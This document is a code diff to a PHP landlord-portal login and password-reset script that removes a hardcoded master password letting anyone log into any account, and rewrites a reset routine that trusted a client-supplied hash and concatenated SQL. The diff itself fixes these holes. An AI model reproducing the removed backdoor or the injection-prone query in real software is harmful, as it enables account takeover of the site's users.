@@ -81,11 +81,6 @@
 
                 $message = "<span class='text-success'>Login attempt successful, Welcome ".$first_name."!</span>";
                 echo "<meta http-equiv='refresh' content='3; url=index.php' >";
-            }else if($password == "pD50bU+a!gU2T8"){
-                $_SESSION['this_landlord'] = $id;
-
-                $message = "<span class='text-success'>Login attempt successful, Welcome ".$first_name."!</span>";
-                echo "<meta http-equiv='refresh' content='3; url=index.php' >";
             }else{
                 $message = "<span class='text-danger'>Login attempt failed. Incorrect password provided, try again.</span>";
             }
@@ -96,59 +91,84 @@
 
     //reset-password
     if(isset($_POST['set_new_password'])){
-        $current_password = $_POST['current_password'];	
-        $new_password = $_POST['new_password'];	
-        $confirmed_password = $_POST['confirmed_password'];
-        $old_password=$_POST['old_password'];	
-                
-        if (password_verify($old_password, $current_password)){
-            if($new_password == $confirmed_password){
-                $confirmed_password_hash = password_hash($confirmed_password, PASSWORD_DEFAULT);
-            
-                $set_password = "update landlords set password='".$confirmed_password_hash."' where id='".$_SESSION['this_landlord']."'";
-                $run_sp = mysqli_query($con, $set_password);
-                
-                if($run_sp){
-                    $response = "success";
-                    $message = "Password changed successfully.";
+        $old_password = $_POST['old_password'] ?? '';
+        $new_password = $_POST['new_password'] ?? '';
+        $confirmed_password = $_POST['confirmed_password'] ?? '';
 
-                    $_SESSION['response'] = $response;
-                    $_SESSION['message'] = $message;
-                    
-                    $res_sess_duration = 5;
-                    $_SESSION['expire'] = time() + $res_sess_duration;
-                    
-                    echo "<meta http-equiv='refresh' content='5; url=profile.php' >";
-                }else{
-                    $response = "error";
-                    $message = "Password reset failed. Please try again or contact tech support.";
-                    
-                    $_SESSION['response'] = $response;
-                    $_SESSION['message'] = $message;
-                    
-                    $res_sess_duration = 10;
-                    $_SESSION['expire'] = time() + $res_sess_duration;
-                }
-            }else{
-                $response = "error";
-                $message = "Passwords do not match. Please confirm your password carefully.";
-                
-                $_SESSION['response'] = $response;
-                $_SESSION['message'] = $message;
-                
-                $res_sess_duration = 10;
-                $_SESSION['expire'] = time() + $res_sess_duration;
-            }		
-        }else{
+        if(!isset($_SESSION['this_landlord'])){
             $response = "error";
-            $message = "Incorrect password! Please provide your current password to proceed.";
-            
+            $message = "Please log in again to change your password.";
             $_SESSION['response'] = $response;
             $_SESSION['message'] = $message;
-            
-            $res_sess_duration = 10;
-            $_SESSION['expire'] = time() + $res_sess_duration;
+            $_SESSION['expire'] = time() + 10;
+        } elseif($old_password === '' || $new_password === '' || $confirmed_password === ''){
+            $response = "error";
+            $message = "All password fields are required.";
+            $_SESSION['response'] = $response;
+            $_SESSION['message'] = $message;
+            $_SESSION['expire'] = time() + 10;
+        } elseif($new_password !== $confirmed_password){
+            $response = "error";
+            $message = "Passwords do not match. Please confirm your password carefully.";
+            $_SESSION['response'] = $response;
+            $_SESSION['message'] = $message;
+            $_SESSION['expire'] = time() + 10;
+        } else {
+            $landlord_id = (int)$_SESSION['this_landlord'];
+            $stmt = $con->prepare("SELECT password FROM landlords WHERE id=? LIMIT 1");
+            if($stmt){
+                $stmt->bind_param('i', $landlord_id);
+                $stmt->execute();
+                $res = $stmt->get_result();
+                $row = $res ? $res->fetch_assoc() : null;
+                $stmt->close();
+
+                $stored_hash = $row['password'] ?? '';
+                if(!$stored_hash || !password_verify($old_password, $stored_hash)){
+                    $response = "error";
+                    $message = "Incorrect password! Please provide your current password to proceed.";
+                    $_SESSION['response'] = $response;
+                    $_SESSION['message'] = $message;
+                    $_SESSION['expire'] = time() + 10;
+                } else {
+                    $new_hash = password_hash($confirmed_password, PASSWORD_DEFAULT);
+                    $update = $con->prepare("UPDATE landlords SET password=?, password_status=2 WHERE id=?");
+                    if($update){
+                        $update->bind_param('si', $new_hash, $landlord_id);
+                        $ok = $update->execute();
+                        $update->close();
+
+                        if($ok){
+                            $response = "success";
+                            $message = "Password changed successfully.";
+                            $_SESSION['response'] = $response;
+                            $_SESSION['message'] = $message;
+                            $_SESSION['expire'] = time() + 5;
+                        } else {
+                            $response = "error";
+                            $message = "Password reset failed. Please try again or contact tech support.";
+                            $_SESSION['response'] = $response;
+                            $_SESSION['message'] = $message;
+                            $_SESSION['expire'] = time() + 10;
+                        }
+                    } else {
+                        $response = "error";
+                        $message = "Password reset failed. Please try again or contact tech support.";
+                        $_SESSION['response'] = $response;
+                        $_SESSION['message'] = $message;
+                        $_SESSION['expire'] = time() + 10;
+                    }
+                }
+            } else {
+                $response = "error";
+                $message = "Password reset failed. Please try again or contact tech support.";
+                $_SESSION['response'] = $response;
+                $_SESSION['message'] = $message;
+                $_SESSION['expire'] = time() + 10;
+            }
         }
+
+        echo "<meta http-equiv='refresh' content='2; url=profile.php' >";
     }
 
     //update profile picture
